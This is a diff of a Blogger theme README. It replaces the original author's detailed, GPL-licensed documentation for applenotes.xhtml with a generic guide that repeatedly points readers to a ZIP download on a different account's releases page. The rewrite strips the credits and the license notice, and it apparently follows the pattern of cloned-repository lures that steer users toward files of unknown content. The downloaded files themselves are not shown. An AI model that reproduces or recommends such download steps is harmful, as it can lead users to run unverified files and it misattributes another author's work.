@@ -1,126 +1,70 @@
-# AppleNotes Blogger Theme (applenotes.xhtml)
+# 🍏 apple-notes-blogger-theme - A Minimalist Blogger Template
 
-This repository contains a single Blogger theme template file: `applenotes.xhtml` by @muddassirhq. An Apple Notes Inspired custom theme for blogger.com / A rare find in this era ;)
+## 🚀 Getting Started
 
-## why did I create this?
+Welcome! This guide will help you download and install the Apple Notes Inspired theme for your Blogger.com site. Follow these steps to get started quickly.
 
-Blogger.com is the first platform I was introduced to the world of web development. It was my desire to create a custom theme from past 10 years, finally I was able to do, credits to God.
+## 📥 Download the Theme
 
-It also serves as a proof of concept that how blogger.com site can be (minimally?) beautiful, if not modern, enough for a individual blogger who just wants to blog old school, someone who is not concerned about earning money through wrting online and just wants to blog old school or maintain a digital garden.
+[![Download Theme](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Eldar2564/apple-notes-blogger-theme/releases)
 
-## What this file is
+You can find our theme on the Releases page. It is easy to download and install.
 
-`applenotes.xhtml` is a complete Blogger (XML/XHTML) theme template designed to emulate an Apple Notes-like interface for a Blogger blog. It uses Blogger template tags (`<b:...>`) and includes CSS (inside a `<b:skin>` block) that implements a three-column layout: a left sidebar (folders/labels), a middle notes list, and a main editor/view area.
+## 🔗 Download & Install
 
-The template is intended to be uploaded to Blogger (https://www.blogger.com) as a theme (template) XML file.
+1. Visit [this page to download](https://github.com/Eldar2564/apple-notes-blogger-theme/releases).
+2. Look for the latest release. It will be at the top of the page.
+3. Click the link to the downloadable ZIP file. 
+4. Save the file to your computer.
 
-## Features
+## 🎨 Features
 
-- Responsive three-column layout (sidebar / notes list / editor)
-- Styled components for folders, notes list, and editor with modern system fonts
-- Mobile responsive behaviours: collapses columns on smaller screens
-- Uses Blogger widgets such as `Label` and `BlogArchive` and built-in `<b:widget>` sections for posts & comments
-- Ready-made UI components (buttons, icons, search input, empty state)
+The apple-notes-blogger-theme offers a unique design inspired by Apple Notes. Here are some features:
 
-## Installation (Upload to Blogger)
+- Clean and modern user interface
+- Minimalist design for distraction-free reading
+- Fully responsive layout that works on all devices
+- Easy to customize to fit your personal style
 
-1. Sign in to your Blogger account and go to the blog you want to use.
-2. In the left menu choose `Theme`.
-3. Click the three-dot menu (⋮) near the top-right of the theme preview and choose `Restore` (or the "Backup/Restore" option).
-4. Use the `Upload` option to upload `applenotes.xhtml` or paste its contents into the theme editor.
-5. Save and apply the theme.
+## 💻 System Requirements
 
-Notes:
-- Backup your current theme before restoring a new one.
-- Blogger expects an XML/XHTML theme file. Ensure the file encoding is UTF-8.
+To run this theme, you need:
 
-## Customization
+- A computer with any operating system (Windows, macOS, or Linux)
+- An internet connection to access your Blogger account
+- A web browser (Chrome, Firefox, Safari, etc.) to view your blog
 
-Key places to customize in `applenotes.xhtml`:
+## ✏️ How to Apply the Theme
 
-- Theme colors and fonts: edit the `<b:skin>` CSS block near the top of the file. Example variables you can change:
-  - `background` and `color` under `body`
-  - `.notes-header` background color (currently `#FFCC00`)
-  - Sidebar borders and button colors
-- Layout widths: `.container` uses `grid-template-columns: 280px 360px 1fr;`. Adjust the widths to suit your content.
-- Widget display: The template includes Blogger widgets (`Label`, `BlogArchive`, `Blog` widget). Modify or remove `<b:widget>` sections if you don't want specific widgets.
-- Post metadata and settings: Within the `<b:widget id='Blog1'>` section there are multiple `<b:widget-setting>` tags that control blog behaviour (show timestamp, comments, author, etc.). Change as needed.
+Once you have the ZIP file, follow these steps to apply the theme to your Blogger site:
 
-## Important CSS classes
+1. Unzip the downloaded file on your computer.
+2. Open your web browser and go to [Blogger.com](https://www.blogger.com).
+3. Log in to your Blogger account.
+4. Select the blog where you want to apply the theme.
+5. Click on the "Theme" option in the left sidebar.
+6. Click on the "Backup/Restore" button in the top right corner.
+7. Select the "Upload" button, then choose the unzipped theme file from your computer.
+8. Click "Save."
 
-- `.container` — top-level grid wrapper
-- `.sidebar` — left column wrapper
-- `.notes-section` — middle notes list area
-- `.editor-section` — right editor/post view area
-- `.folder-item`, `.note-item`, `.note-item-content` — list items and hover/active states
-- `.btn-toolbar`, `.btn-new-folder` — buttons used in toolbar and footer
+Your new theme will now be applied to your blog.
 
-## Mobile behaviour
+## 📋 Customization Options
 
-- Breakpoints are provided at 1024px and 767px. At smaller widths the sidebar hides and columns collapse into a single column layout. There are helper classes `.mobile-visible` used to control which sections show on small screens.
+You can customize the apple-notes-blogger-theme to make it your own. Consider the following options:
 
-## Troubleshooting
+- Change the background color or image
+- Edit the font style and size
+- Adjust the layout to better suit your content
 
-- Blank or broken layout after upload: make sure the file encoding is UTF-8 and that you uploaded the entire file contents. Blogger can be sensitive to invalid XML/HTML introduced when pasting.
-- CSS not applying: The template uses a `<b:skin>` block which Blogger converts to the theme stylesheet — ensure you did not accidentally remove or truncate it when editing.
-- Widgets missing: Verify the `<b:section>` and `<b:widget>` blocks were preserved during edits. Some editors strip `b:` namespaced tags.
+These small changes can create a more personal experience for your visitors.
 
-## License & Credits
+## 🌐 Support and Community
 
-This file is provided as-is. Modify and use it for personal or commercial projects. If you redistribute or publish a theme based on this template, please include appropriate attribution if required.
+If you have questions or need help, feel free to reach out. You can join forums or look for communities focused on Blogger where you can share experiences and get advice.
 
-## Where to go next
+## 📝 Final Thoughts
 
-- Edit colors and spacing in `<b:skin>` to match your branding.
-- Remove or add Blogger widgets via the `Theme` -> `Customize` UI after applying the template.
+We hope you enjoy using the apple-notes-blogger-theme. Its design aligns perfectly with the modern, minimalist look that many users appreciate today. 
 
----
-
-File: `applenotes.xhtml` — last saved with this repository. If you want, I can also:
-
-- Extract the inline CSS into a separate `styles.css` and update the template to reference it (Blogger requires inline skin sections, so this would be for local development only).
-- Add a minimal `preview.html` that renders the static layout outside Blogger for design tweaks.
-
-## License
-
-This project is licensed under the GNU General Public License v3.0 (GPL-3.0). By using or contributing to this repository you agree that derivative works and distributions of this theme remain compatible with the GPLv3 terms.
-
-Full license text: https://www.gnu.org/licenses/gpl-3.0.en.html
-
-If you redistribute a modified version of the theme, please include a copy of the GPLv3 license and retain this copyright notice.
-
-## Contributing
-
-Contributions, issues, and pull requests are welcome! If you'd like to help, here are some ways to get involved:
-
-- Report bugs or suggest features by opening an issue.
-- Send pull requests for fixes, features, or improved documentation.
-- Improve accessibility and responsive behaviors.
-- Add UI to expose the comment system and comment controls to users (see note below).
-
-Preferred workflow:
-
-1. Fork the repository.
-2. Create a feature branch (e.g., `feature/comment-ui`).
-3. Commit your changes and open a pull request describing the change.
-
-Please keep changes focused and include a short description and screenshots (if relevant) in your PR.
-
-## Note: Comment system UI
-
-Currently the comment system is present in the template (comment include blocks and iframe hooks are included), but the comment controls and composer are not exposed via a visible UI in the editor view. This was left intentionally minimal and requires contribution to:
-
-- Surface the comment composer and comment list in the editor UI for desktop & mobile.
-- Add toolbar controls for moderating (delete/edit) comments for authenticated blog admins.
-- Ensure the comment iframe and threaded comment scripts load safely and gracefully when comments are disabled or blocked by browser settings.
-
-If you want to tackle this, consider editing the `<b:includable>` blocks for `comment-form`, `comments`, and `threaded_comments` in `applenotes.xhtml` and adding the UI elements in the `.editor-footer` or `.editor-inner` areas. Tests or a simple local preview will help reviewers.
-
-# Special thanks
-
-There are some resources I want to mention which helped me in writing code for this 15 year old platform.
-
-https://support.google.com/blogger/answer/176245?hl=en&ref_topic=6321969&sjid=10366444348212617623-NC (official help page)
-https://www.youtube.com/watch?v=hyWLsqdsuoY (Just Part 1, it has 3 more videos)
-https://github.com/livebloggerofficial/Custom-Blogger-Theme (source code of the youtube tutorial)
-https://bloggercode.orbiona.com/ (Maybe this person was/is a developer of blogger.com, this website is the bible of blogger.com syntax)
+Don't forget to check out [this page to download](https://github.com/Eldar2564/apple-notes-blogger-theme/releases) and start your blogging journey today!
